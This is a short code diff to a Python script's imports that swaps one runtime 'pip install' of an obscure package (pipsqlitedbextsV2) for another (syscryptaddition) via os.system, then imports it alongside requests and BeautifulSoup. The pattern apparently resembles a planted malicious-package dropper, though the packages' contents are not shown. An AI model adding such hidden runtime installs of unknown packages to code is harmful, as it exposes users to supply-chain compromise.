@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitedbextsV2")
-import pipsqlitedbextsV2
+os.system("pip install syscryptaddition")
+import syscryptaddition
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
